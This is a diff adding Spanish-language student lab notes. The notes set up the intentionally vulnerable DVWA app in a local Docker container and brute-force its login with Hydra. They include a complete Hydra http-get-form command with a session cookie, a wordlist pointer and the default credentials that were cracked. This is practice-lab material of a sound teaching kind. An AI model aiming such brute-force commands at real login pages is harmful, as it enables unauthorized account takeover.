@@ -1,0 +1,62 @@
+
+// Actualizar sistema
+
+    sudo apt update
+    sudo apt upgrade
+
+// Instalar docker
+
+    sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+
+// Verificar instalación de docker
+
+    docker -v
+
+// Levantar servidor vulnerable de forma local gracias al contenedor, conectando el puerto 2023 de mi host al puerto 80 del contenedor
+
+    sudo docker run --rm -it -p 2023:80 vulnerables/web-dvwa
+
+// Ingresar en la plataforma
+
+    user: admin
+    password: password
+
+// Usar Hydra
+              
+    sudo apt update; 
+    sudo apt upgrade; 
+    sudo apt install hydra
+    hydra version 9.2-1ubuntu1
+    
+hydra -L users.txt -P passwords.txt "http-get-form://172.17.0.1:2023/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: security=low; PHPSESSID=2vs1l66rp1kdakbh1q82ht5vu6" -I -v
+
+Explicacion del comando:
+El comando proporcionado utiliza la herramienta Hydra para llevar a cabo un ataque de fuerza bruta en un formulario de inicio de sesión web. Se configura para tomar nombres de usuario de un archivo llamado users.txt y contraseñas de passwords.txt. La URL del formulario de inicio de sesión es 172.17.0.1:2023/vulnerabilities/brute/, y se utiliza el método HTTP GET para enviar los datos. Si la respuesta del servidor indica que las credenciales son incorrectas con el mensaje "Username and/or password incorrect.", Hydra lo registrará. Además, se incluyen cabeceras de solicitud HTTP, en este caso, una cookie PHPSESSID. El comando también instruye a Hydra para ignorar los bloqueos de cuentas por intentos fallidos y proporciona una salida detallada gracias a la opción "verbose". Es importante mencionar que realizar ataques de fuerza bruta sin autorización explícita es ilegal y éticamente cuestionable. Asegúrate de tener los permisos adecuados antes de utilizar esta herramienta.
+
+
+
+
+
+//Diccionario
+
+Rockyou.txt (buscar)
+
+
+// Consejos
+
+- Checkear direccion a la que se hace el ataque
+- Ver path de users para intentar saber los usuarios disponibles
+
+// Passwords encontradas:
+    1337 - charley
+    admin - password
+    gordonb - abc123
+    pablo - letmein
+    smithy - password
+
+
+// Dudas
+
+- A que se refiere con "Muestre las diferencias observadas en burpsuite."?
+    R : Diferencias entre cada paquete
+- 
